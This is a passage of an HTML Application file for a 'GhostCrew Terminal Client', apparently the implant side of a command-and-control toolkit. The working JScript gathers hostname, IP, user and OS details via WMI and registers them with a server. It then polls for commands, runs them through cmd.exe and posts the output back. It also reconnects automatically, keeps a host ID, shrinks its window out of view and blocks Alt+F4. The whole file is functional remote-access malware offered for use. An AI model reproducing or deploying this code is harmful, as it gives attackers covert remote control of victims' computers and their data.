 A})}).call(this);
    </script>
</head>
<body>
    <div class="header">
        🔥 GhostCrew Terminal Client v3.0 - Enhanced Shell Session Support 🔥
    </div>
    
    <div class="log-container" id="log-container">
        <!-- Log messages will appear here -->
    </div>
    
    <div class="status-bar">
        <div class="connection-info" id="connection-status">Initializing...</div>
        <div class="session-info" id="session-info">No active session</div>
    </div>

    <script>
        // ===================== CONFIGURATION =====================
        var CONFIG = {
            SERVER_URL: "http://localhost/GhostCrew/api.php",
            POLL_INTERVAL: 1500,  // Poll every 1.5 seconds for better responsiveness
            PING_INTERVAL: 30000, // Ping server every 30 seconds
            AUTO_RECONNECT: true,
            MAX_RECONNECT_ATTEMPTS: 10,
            RECONNECT_DELAY_BASE: 3000, // Base delay between reconnections
            MAX_LOG_LINES: 150,
            COMMAND_TIMEOUT: 300000, // 5 minutes timeout for long-running commands
            DEBUG: true
        };

        // ===================== GLOBAL VARIABLES =====================
        var SYSTEM = {
            hostId: null,
            isConnected: false,
            isRegistered: false,
            reconnectAttempts: 0,
            lastActivity: 0,
            systemInfo: null
        };

        var SESSION = {
            activeSessionId: null,
            currentDirectory: null,
            environmentVars: {},
            shellProcess: null,
            commandQueue: [],
            processingCommand: false,
            sessionStartTime: null
        };

        var TIMERS = {
            pollTimer: null,
            pingTimer: null,
            reconnectTimer: null
        };

        // ===================== UTILITY FUNCTIONS =====================
        
        // Console compatibility for older IE versions
        if (typeof console === 'undefined') {
            window.console = {
                log: function() {},
                error: function() {},
                warn: function() {},
                info: function() {}
            };
        }
        
        // Object.keys compatibility for older IE versions
        if (!Object.keys) {
            Object.keys = function(obj) {
                var keys = [];
                for (var key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        keys.push(key);
                    }
                }
                return keys;
            };
        }
        
        // String methods compatibility for older IE
        if (!String.prototype.trim) {
            String.prototype.trim = function() {
                return this.replace(/^\s+|\s+$/g, '');
            };
        }
        
        if (!String.prototype.startsWith) {
            String.prototype.startsWith = function(searchString) {
                return this.indexOf(searchString) === 0;
            };
        }
        
        function log(message, type) {
            type = type || 'info';
            var timestamp = new Date().toLocaleTimeString();
            var logContainer = document.getElementById('log-container');
            var className = type;
            
            var logEntry = document.createElement('div');
            logEntry.className = className;
            logEntry.innerHTML = '[' + timestamp + '] ' + message;
            
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
            
            // Limit log lines
            var logLines = logContainer.children;
            if (logLines.length > CONFIG.MAX_LOG_LINES) {
                logContainer.removeChild(logLines[0]);
            }
            
            // Only log to console if it's actually available and functional
            if (CONFIG.DEBUG && typeof console !== 'undefined' && console.log) {
                try {
                    console.log('[' + type.toUpperCase() + '] ' + message);
                } catch(e) {
                    // Ignore console errors in HTA environment
                }
            }
        }

        function updateConnectionStatus(status) {
            document.getElementById('connection-status').textContent = status;
            document.title = 'GhostCrew Client - ' + status;
        }

        function updateSessionInfo(info) {
            document.getElementById('session-info').textContent = info;
        }

        function generateUniqueId() {
            return 'host_' + new Date().getTime() + '_' + Math.random().toString(36).substr(2, 9);
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.appendChild(document.createTextNode(text));
            return div.innerHTML;
        }

        // ===================== SHELL MANAGEMENT =====================
        function initializeShell() {
            try {
                SESSION.shellProcess = new ActiveXObject("WScript.Shell");
                SESSION.currentDirectory = SESSION.shellProcess.ExpandEnvironmentStrings("%USERPROFILE%");
                
                // Initialize common environment variables
                var commonVars = ["PATH", "TEMP", "TMP", "USERPROFILE", "COMPUTERNAME", "USERNAME", "USERDOMAIN", "PROCESSOR_ARCHITECTURE"];
                SESSION.environmentVars = {};
                
                var loadedVarsCount = 0;
                for (var i = 0; i < commonVars.length; i++) {
                    try {
                        var varName = commonVars[i];
                        var varValue = SESSION.shellProcess.ExpandEnvironmentStrings("%" + varName + "%");
                        if (varValue && varValue !== ("%" + varName + "%")) {
                            SESSION.environmentVars[varName] = varValue;
                            loadedVarsCount++;
                        }
                    } catch(e) {
                        // Skip unavailable environment variables
                    }
                }
                
                log("Shell initialized successfully", "success");
                log("Working directory: " + SESSION.currentDirectory, "info");
                log("Environment variables loaded: " + loadedVarsCount, "info");
                
                return true;
            } catch (e) {
                log("Failed to initialize shell: " + e.message, "error");
                return false;
            }
        }

        function resetShellForNewSession() {
            try {
                // Reset to user profile directory for new sessions
                SESSION.currentDirectory = SESSION.shellProcess.ExpandEnvironmentStrings("%USERPROFILE%");
                log("Shell environment reset for new session", "info");
                log("Working directory reset to: " + SESSION.currentDirectory, "info");
            } catch (e) {
                log("Error resetting shell environment: " + e.message, "error");
            }
        }

        // ===================== SYSTEM INFORMATION =====================
        function collectSystemInfo() {
            var info = {
                hostname: "Unknown",
                ipAddress: "127.0.0.1",
                osInfo: "Unknown",
                userInfo: "Unknown",
                architecture: "Unknown",
                domain: "Unknown"
            };

            try {
                // Get network information
                var network = new ActiveXObject("WScript.Network");
                info.hostname = network.ComputerName || "Unknown";
                info.userInfo = (network.UserDomain ? network.UserDomain + "\\" : "") + network.UserName;
                info.domain = network.UserDomain || "WORKGROUP";

                // Get system information via WMI
                var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
                
                // OS Information
                var osQuery = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
                var osEnum = new Enumerator(osQuery);
                if (!osEnum.atEnd()) {
                    var osItem = osEnum.item();
                    info.osInfo = osItem.Caption + " " + osItem.Version;
                    if (osItem.OSArchitecture) {
                        info.architecture = osItem.OSArchitecture;
                    }
                }

                // Network adapter information for IP
                var nicQuery = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
                var nicEnum = new Enumerator(nicQuery);
                
                while (!nicEnum.atEnd()) {
                    var nicItem = nicEnum.item();
                    if (nicItem.IPAddress) {
                        var ipArray = new VBArray(nicItem.IPAddress).toArray();
                        for (var i = 0; i < ipArray.length; i++) {
                            var ip = ipArray[i];
                            // Look for IPv4 address that's not loopback
                            if (ip.indexOf('.') > 0 && ip !== '127.0.0.1' && !ip.startsWith('169.254.')) {
                                info.ipAddress = ip;
                                break;
                            }
                        }
                        if (info.ipAddress !== "127.0.0.1") break;
                    }
                    nicEnum.moveNext();
                }

            } catch (e) {
                log("Error collecting system information: " + e.message, "error");
            }

            SYSTEM.systemInfo = info;
            log("System Info: " + info.hostname + " (" + info.ipAddress + ") - " + info.userInfo, "info");
            return info;
        }

        // ===================== SERVER COMMUNICATION =====================
        function makeServerRequest(action, data, callback, timeout) {
            timeout = timeout || 30000; // 30 second default timeout
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", CONFIG.SERVER_URL, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.timeout = timeout;
            
            var requestData = "action=" + encodeURIComponent(action);
            if (data) {
                for (var key in data) {
                    if (data.hasOwnProperty(key)) {
                        requestData += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(data[key]);
                    }
                }
            }
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (callback) callback(null, response);
                        } catch (e) {
                            log("JSON parse error: " + e.message, "error");
                            if (callback) callback(e, null);
                        }
                    } else {
                        var error = new Error("HTTP " + xhr.status + ": " + xhr.statusText);
                        if (callback) callback(error, null);
                    }
                }
            };
            
            xhr.onerror = function() {
                var error = new Error("Network error");
                if (callback) callback(error, null);
            };
            
            xhr.ontimeout = function() {
                var error = new Error("Request timeout");
                if (callback) callback(error, null);
            };
            
            xhr.send(requestData);
        }

        function registerWithServer() {
            if (!SYSTEM.systemInfo) {
                collectSystemInfo();
            }
            
            log("Registering with server...", "info");
            updateConnectionStatus("Registering...");
            
            var registrationData = {
                hostname: SYSTEM.systemInfo.hostname,
                ip_address: SYSTEM.systemInfo.ipAddress,
                os_info: SYSTEM.systemInfo.osInfo + " (" + SYSTEM.systemInfo.architecture + ")"
            };
            
            if (SYSTEM.hostId) {
                registrationData.host_id = SYSTEM.hostId;
            }
            
            makeServerRequest("register_host", registrationData, function(error, response) {
                if (error) {
                    log("Registration failed: " + error.message, "error");
                    handleConnectionError(error);
                    return;
                }
                
                if (response.status === "success") {
                    SYSTEM.hostId = response.host_id;
                    SYSTEM.isRegistered = true;
                    SYSTEM.isConnected = true;
                    SYSTEM.reconnectAttempts = 0;
                    SYSTEM.lastActivity = new Date().getTime();
                    
                    // Persist host ID
                    try {
                        localStorage.setItem("ghostcrew_host_id", SYSTEM.hostId);
                    } catch(e) {
                        // LocalStorage not available in some IE versions
                    }
                    
                    log("Successfully registered with server", "success");
                    log("Host ID: " + SYSTEM.hostId, "info");
                    updateConnectionStatus("Connected - " + SYSTEM.systemInfo.hostname);
                    
                    startServices();
                } else {
                    log("Registration failed: " + response.message, "error");
                    handleConnectionError(new Error(response.message));
                }
            });
        }

        function startServices() {
            // Start command polling
            if (TIMERS.pollTimer) clearInterval(TIMERS.pollTimer);
            TIMERS.pollTimer = setInterval(pollForCommands, CONFIG.POLL_INTERVAL);
            
            // Start ping timer
            if (TIMERS.pingTimer) clearInterval(TIMERS.pingTimer);
            TIMERS.pingTimer = setInterval(pingServer, CONFIG.PING_INTERVAL);
            
            log("Services started - Polling every " + (CONFIG.POLL_INTERVAL/1000) + "s", "success");
        }

        function stopServices() {
            if (TIMERS.pollTimer) {
                clearInterval(TIMERS.pollTimer);
                TIMERS.pollTimer = null;
            }
            if (TIMERS.pingTimer) {
                clearInterval(TIMERS.pingTimer);
                TIMERS.pingTimer = null;
            }
            if (TIMERS.reconnectTimer) {
                clearInterval(TIMERS.reconnectTimer);
                TIMERS.reconnectTimer = null;
            }
            log("All services stopped", "info");
        }

        function pingServer() {
            if (!SYSTEM.isConnected || !SYSTEM.hostId) return;
            
            makeServerRequest("ping_host", { host_id: SYSTEM.hostId }, function(error, response) {
                if (error) {
                    log("Ping failed: " + error.message, "warning");
                    handleConnectionError(error);
                    return;
                }
                
                if (response.status === "success") {
                    SYSTEM.lastActivity = new Date().getTime();
                    // log("Server ping successful", "info");  // Comment out to reduce log spam
                } else {
                    log("Ping error: " + response.message, "warning");
                    handleConnectionError(new Error(response.message));
                }
            });
        }

        // ===================== COMMAND PROCESSING =====================
        function pollForCommands() {
            if (!SYSTEM.isConnected || !SYSTEM.hostId || SESSION.processingCommand) {
                return;
            }
            
            makeServerRequest("get_command", { host_id: SYSTEM.hostId }, function(error, response) {
                if (error) {
                    log("Command polling error: " + error.message, "error");
                    handleConnectionError(error);
                    return;
                }
                
                if (response.status === "success" && response.command && response.command !== "") {
                    SYSTEM.lastActivity = new Date().getTime();
                    
                    // Check if this is a new session
                    if (response.session_id && response.session_id !== SESSION.activeSessionId) {
                        handleNewSession(response.session_id);
                    }
                    
                    // Process the command
                    processCommand({
                        id: response.command_id,
                        command: response.command,
                        sessionId: response.session_id || SESSION.activeSessionId
                    });
                }
            });
        }

        function handleNewSession(sessionId) {
            if (SESSION.activeSessionId) {
                log("Ending previous session: " + SESSION.activeSessionId, "info");
            }
            
            SESSION.activeSessionId = sessionId;
            SESSION.sessionStartTime = new Date().getTime();
            resetShellForNewSession();
            
            log("New session started: " + sessionId, "success");
            updateSessionInfo("Active: " + sessionId.substring(0, 12) + "...");
        }

        function processCommand(commandData) {
            SESSION.processingCommand = true;
            var startTime = new Date().getTime();
            
            log("Executing: " + commandData.command, "command");
            updateConnectionStatus("Executing command...");
            
            try {
                var result = executeCommand(commandData.command);
                var executionTime = (new Date().getTime() - startTime) / 1000;
                
                log("Command completed in " + executionTime + "s", "info");
                
                submitCommandResult(commandData.id, result, executionTime);
                
            } catch (e) {
                var executionTime = (new Date().getTime() - startTime) / 1000;
                var errorResult = "Error executing command: " + e.message;
                
                log("Command failed: " + e.message, "error");
                submitCommandResult(commandData.id, errorResult, executionTime);
            }
            
            SESSION.processingCommand = false;
            updateConnectionStatus("Connected - " + SYSTEM.systemInfo.hostname);
        }

        function executeCommand(command) {
            var lowerCommand = command.toLowerCase();
            if (typeof lowerCommand.trim === 'function') {
                lowerCommand = lowerCommand.trim();
            } else {
                lowerCommand = lowerCommand.replace(/^\s+|\s+$/g, '');
            }
            
            // Handle built-in commands
            if (lowerCommand === "pwd" || lowerCommand === "cd") {
                return SESSION.currentDirectory;
            }
            
            if (lowerCommand.indexOf("cd ") === 0) {
                return handleChangeDirectory(command);
            }
            
            if (lowerCommand.indexOf("set ") === 0 && lowerCommand.indexOf("=") > 0) {
                return handleSetEnvironmentVariable(command);
            }
            
            if (lowerCommand === "env" || lowerCommand === "set") {
                return handleShowEnvironment();
            }
            
            if (lowerCommand === "cls" || lowerCommand === "clear") {
                return "Screen cleared (not applicable in remote session)";
            }
            
            // Execute regular command with full context
            return executeCommandWithShellContext(command);
        }

        function handleChangeDirectory(command) {
            try {
                var newPath = command.substring(3);
                if (typeof newPath.trim === 'function') {
                    newPath = newPath.trim();
                } else {
                    newPath = newPath.replace(/^\s+|\s+$/g, '');
                }
                
                if (newPath === "") {
                    return SESSION.currentDirectory;
                }
                
                // Handle relative and absolute paths
                var targetPath;
                if (newPath.indexOf(":") !== -1 || newPath.charAt(0) === "\\" || newPath.charAt(0) === "/") {
                    // Absolute path
                    targetPath = SESSION.shellProcess.ExpandEnvironmentStrings(newPath);
                } else {
                    // Relative path
                    var separator = SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) === "\\" ? "" : "\\";
                    targetPath = SESSION.currentDirectory + separator + newPath;
                }
                
                // Normalize path
                targetPath = SESSION.shellProcess.ExpandEnvironmentStrings(targetPath);
                
                // Check if directory exists
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                if (fso.FolderExists(targetPath)) {
                    SESSION.currentDirectory = targetPath;
                    if (SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) !== "\\") {
                        SESSION.currentDirectory += "\\";
                    }
                    log("Changed directory to: " + SESSION.currentDirectory, "info");
                    return SESSION.currentDirectory;
                } else {
                    return "The system cannot find the path specified: " + targetPath;
                }
                
            } catch (e) {
                return "Error changing directory: " + e.message;
            }
        }

        function handleSetEnvironmentVariable(command) {
            try {
                var parts = command.substring(4).split("=");
                if (parts.length >= 2) {
                    var varName = parts[0];
                    if (typeof varName.trim === 'function') {
                        varName = varName.trim().toUpperCase();
                    } else {
                        varName = varName.replace(/^\s+|\s+$/g, '').toUpperCase();
                    }
                    
                    var varValue = parts.slice(1).join("=");
                    if (typeof varValue.trim === 'function') {
                        varValue = varValue.trim();
                    } else {
                        varValue = varValue.replace(/^\s+|\s+$/g, '');
                    }
                    
                    // Remove quotes if present
                    if ((varValue.charAt(0) === '"' && varValue.charAt(varValue.length - 1) === '"') ||
                        (varValue.charAt(0) === "'" && varValue.charAt(varValue.length - 1) === "'")) {
                        varValue = varValue.substring(1, varValue.length - 1);
                    }
                    
                    SESSION.environmentVars[varName] = varValue;
                    log("Environment variable set: " + varName + "=" + varValue, "info");
                    return "Environment variable " + varName + " has been set.";
                } else {
                    return "Invalid SET command syntax. Use: SET VARIABLE=VALUE";
                }
            } catch (e) {
                return "Error setting environment variable: " + e.message;
            }
        }

        function handleShowEnvironment() {
            try {
                var envList = [];
                var count = 0;
                for (var varName in SESSION.environmentVars) {
                    if (SESSION.environmentVars.hasOwnProperty(varName)) {
                        envList.push(varName + "=" + SESSION.environmentVars[varName]);
                        count++;
                    }
                }
                if (count === 0) {
                    return "No custom environment variables set.";
                }
                return envList.join("\r\n");
            } catch (e) {
                return "Error displaying environment variables: " + e.message;
            }
        }

        function executeCommandWithShellContext(command) {
            try {
                // Build environment setup commands
                var envSetup = [];
                for (var varName in SESSION.environmentVars) {
                    if (SESSION.environmentVars.hasOwnProperty(varName)) {
                        envSetup.push("SET " + varName + "=" + SESSION.environmentVars[varName]);
                    }
                }
                
                // Build the complete command with context
                var contextualCommand = [];
                
                // Set environment variables
                if (envSetup.length > 0) {
                    contextualCommand = contextualCommand.concat(envSetup);
                }
                
                // Change to current directory
                contextualCommand.push("CD /D \"" + SESSION.currentDirectory + "\"");
                
                // Add the actual command
                contextualCommand.push(command);
                
                // Join all commands
                var fullCommand = contextualCommand.join(" && ");
                
                log("Executing: " + command + " (in " + SESSION.currentDirectory + ")", "info");
                
                // Execute command directly and capture output using WScript.Shell.Exec
                try {
                    var exec = SESSION.shellProcess.Exec("cmd.exe /C \"" + fullCommand + "\"");
                    
                    // Wait for command to complete and read output
                    var output = "";
                    var errorOutput = "";
                    
                    // Read stdout
                    while (!exec.StdOut.AtEndOfStream) {
                        output += exec.StdOut.ReadAll();
                    }
                    
                    // Read stderr
                    while (!exec.StdErr.AtEndOfStream) {
                        errorOutput += exec.StdErr.ReadAll();
                    }
                    
                    // Wait for process to finish
                    while (exec.Status === 0) {
                        // Wait a bit
                        WScript.Sleep(50);
                    }
                    
                    var exitCode = exec.ExitCode;
                    
                    // Combine output and error output
                    var fullOutput = output;
                    if (errorOutput) {
                        if (fullOutput) {
                            fullOutput += "\n" + errorOutput;
                        } else {
                            fullOutput = errorOutput;
                        }
                    }
                    
                    // Process the output
                    var trimmedOutput = fullOutput;
                    if (typeof trimmedOutput.trim === 'function') {
                        trimmedOutput = trimmedOutput.trim();
                    } else {
                        trimmedOutput = trimmedOutput.replace(/^\s+|\s+$/g, '');
                    }
                    
                    log("Command output length: " + trimmedOutput.length + " chars", "info");
                    if (trimmedOutput.length > 0) {
                        log("Output preview: " + trimmedOutput.substring(0, 100) + (trimmedOutput.length > 100 ? "..." : ""), "info");
                    }
                    
                    // Check if command changed the working directory
                    updateCurrentDirectory();
                    
                    // Return the actual output
                    if (trimmedOutput.length > 0) {
                        return trimmedOutput;
                    } else {
                        if (exitCode === 0) {
                            return "Command completed successfully (no output).";
                        } else {
                            return "Command completed with exit code: " + exitCode;
                        }
                    }
                    
                } catch (execError) {
                    // Fallback to Run method if Exec fails
                    log("Exec method failed, trying Run method: " + execError.message, "warning");
                    return executeCommandWithRunMethod(fullCommand);
                }
                
            } catch (e) {
                return "Error executing command: " + e.message;
            }
        }
        
        function executeCommandWithRunMethod(fullCommand) {
            try {
                // Fallback method using Run with temporary file (only as last resort)
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var tempDir = SESSION.shellProcess.ExpandEnvironmentStrings("%TEMP%");
                var tempFile = tempDir + "\\ghostcrew_" + new Date().getTime() + "_" + Math.floor(Math.random() * 10000) + ".tmp";
                
                // Execute command and redirect to temp file
                var cmdLine = "cmd.exe /C \"" + fullCommand + "\" > \"" + tempFile + "\" 2>&1";
                
                log("Using fallback Run method with temp file", "warning");
                
                var execResult = SESSION.shellProcess.Run(cmdLine, 0, true);
                
                // Read the output
                var output = "";
                var outputFound = false;
                
                // Give the file system a moment to write the file
                WScript.Sleep(100);
                
                if (fso.FileExists(tempFile)) {
                    try {
                        var file = fso.OpenTextFile(tempFile, 1);
                        if (!file.AtEndOfStream) {
                            output = file.ReadAll();
                            outputFound = true;
                        }
                        file.Close();
                    } catch (readError) {
                        output = "Error reading command output: " + readError.message;
                        outputFound = true;
                    }
                    
                    // Clean up temp file
                    try {
                        fso.DeleteFile(tempFile);
                    } catch (deleteError) {
                        log("Could not delete temp file: " + deleteError.message, "warning");
                    }
                } else {
                    log("Temp file was not created at: " + tempFile, "error");
                    return "Error: Could not capture command output (temp file not created).";
                }
                
                // Process the output
                var trimmedOutput = output;
                if (typeof trimmedOutput.trim === 'function') {
                    trimmedOutput = trimmedOutput.trim();
                } else {
                    trimmedOutput = trimmedOutput.replace(/^\s+|\s+$/g, '');
                }
                
                if (trimmedOutput.length > 0) {
                    return trimmedOutput;
                } else if (outputFound) {
                    if (execResult === 0) {
                        return "Command completed successfully (no output).";
                    } else {
                        return "Command completed with exit code: " + execResult;
                    }
                } else {
                    return "Error: Could not capture command output.";
                }
                
            } catch (e) {
                return "Error in fallback execution method: " + e.message;
            }
        }

        function updateCurrentDirectory() {
            try {
                // Get current directory by executing 'cd' command
                var tempFile = SESSION.shellProcess.ExpandEnvironmentStrings("%TEMP%\\ghostcrew_pwd_" + new Date().getTime() + ".tmp");
                var cmdLine = "cmd.exe /C \"CD /D \"" + SESSION.currentDirectory + "\" && CD\" > \"" + tempFile + "\"";
                
                SESSION.shellProcess.Run(cmdLine, 0, true);
                
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                if (fso.FileExists(tempFile)) {
                    try {
                        var file = fso.OpenTextFile(tempFile, 1);
                        if (!file.AtEndOfStream) {
                            var newDir = file.ReadAll();
                            if (typeof newDir.trim === 'function') {
                                newDir = newDir.trim();
                            } else {
                                newDir = newDir.replace(/^\s+|\s+$/g, '');
                            }
                            
                            var currentDirWithoutSlash = SESSION.currentDirectory.replace(/\\$/, "");
                            if (newDir && newDir !== currentDirWithoutSlash) {
                                SESSION.currentDirectory = newDir;
                                if (SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) !== "\\") {
                                    SESSION.currentDirectory += "\\";
                                }
                                log("Working directory updated: " + SESSION.currentDirectory, "info");
                            }
                        }
                        file.Close();
                    } catch (e) {
                        // Ignore errors
                    }
                    
                    try {
                        fso.DeleteFile(tempFile);
                    } catch (e) {
                        // Ignore cleanup errors
                    }
                }
            } catch (e) {
                // Ignore errors in directory detection
            }
        }

        function submitCommandResult(commandId, output, executionTime) {
            log("Submitting command result...", "info");
            
            var resultData = {
                command_id: commandId,
                output: output,
                execution_time: executionTime
            };
            
            makeServerRequest("submit_result", resultData, function(error, response) {
                if (error) {
                    log("Failed to submit result: " + error.message, "error");
                    return;
                }
                
                if (response.status === "success") {
                    log("Command result submitted successfully", "success");
                } else {
                    log("Server rejected result: " + response.message, "error");
                }
            });
        }

        // ===================== CONNECTION MANAGEMENT =====================
        function handleConnectionError(error) {
            SYSTEM.isConnected = false;
            log("Connection error: " + error.message, "error");
            
            if (CONFIG.AUTO_RECONNECT && SYSTEM.reconnectAttempts < CONFIG.MAX_RECONNECT_ATTEMPTS) {
                attemptReconnection();
            } else {
                updateConnectionStatus("Connection failed");
                updateSessionInfo("No active session");
                stopServices();
            }
        }

        function attemptReconnection() {
            SYSTEM.reconnectAttempts++;
            var delay = CONFIG.RECONNECT_DELAY_BASE * SYSTEM.reconnectAttempts;
            
            log("Attempting reconnection " + SYSTEM.reconnectAttempts + "/" + CONFIG.MAX_RECONNECT_ATTEMPTS + " in " + (delay/1000) + "s", "warning");
            updateConnectionStatus("Reconnecting in " + (delay/1000) + "s...");
            
            if (TIMERS.reconnectTimer) clearTimeout(TIMERS.reconnectTimer);
            TIMERS.reconnectTimer = setTimeout(function() {
                log("Reconnection attempt " + SYSTEM.reconnectAttempts + "/" + CONFIG.MAX_RECONNECT_ATTEMPTS, "info");
                registerWithServer();
            }, delay);
        }

        // ===================== INITIALIZATION =====================
        function initialize() {
            log("GhostCrew Terminal Client v3.0 initializing...", "info");
            log("Enhanced with persistent shell session support", "info");
            
            // Try to restore previous host ID
            try {
                var savedHostId = localStorage.getItem("ghostcrew_host_id");
                if (savedHostId) {
                    SYSTEM.hostId = savedHostId;
                    log("Restored previous host ID: " + SYSTEM.hostId, "info");
                }
            } catch(e) {
                // LocalStorage not available
                log("LocalStorage not available, will generate new host ID", "warning");
            }
            
            // Initialize shell
            if (!initializeShell()) {
                log("Failed to initialize shell - terminal functionality will be limited", "error");
                updateConnectionStatus("Shell initialization failed");
                return;
            }
            
            // Collect system information
            collectSystemInfo();
            
            // Start connection process
            registerWithServer();
            
            // Minimize window after initialization
            setTimeout(function() {
                try {
                    window.resizeTo(500, 280);
                    setTimeout(function() {
                        window.blur();
                    }, 1000);
                } catch(e) {
                    log("Could not minimize window: " + e.message, "warning");
                }
            }, 2000);
        }

        // ===================== EVENT HANDLERS =====================
        window.onload = function() {
            initialize();
        };

        window.onbeforeunload = function() {
            log("Client shutting down...", "info");
            
            // Attempt to notify server of disconnect
            if (SYSTEM.isConnected && SYSTEM.hostId) {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", CONFIG.SERVER_URL, false); // Synchronous for onbeforeunload
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("action=ping_host&host_id=" + encodeURIComponent(SYSTEM.hostId) + "&status=disconnecting");
                } catch(e) {
                    // Ignore errors during shutdown
                }
            }
            
            stopServices();
        };

        window.onerror = function(message, source, lineno, colno, error) {
            log("JavaScript error: " + message + " at " + source + ":" + lineno, "error");
            return false; // Don't suppress the error
        };

        // Prevent accidental closure
        window.onkeydown = function(e) {
            // Prevent Alt+F4
            if (e.altKey && e.keyCode === 115) {
                e.preventDefault();
                return false;
            }
        };

        // Keep the application responsive
        setInterval(function() {
            // Basic heartbeat to prevent IE from freezing
            var now = new Date().getTime();
            if (SYSTEM.isConnected && (now - SYSTEM.lastActivity) > 300000) { // 5 minutes
                log("Long period of inactivity detected, checking connection...", "warning");
                pingServer();
            }
        }, 60000); // Check every minute

        log("GhostCrew Terminal Client loaded and ready", "success");
    </script>
</body>
</html>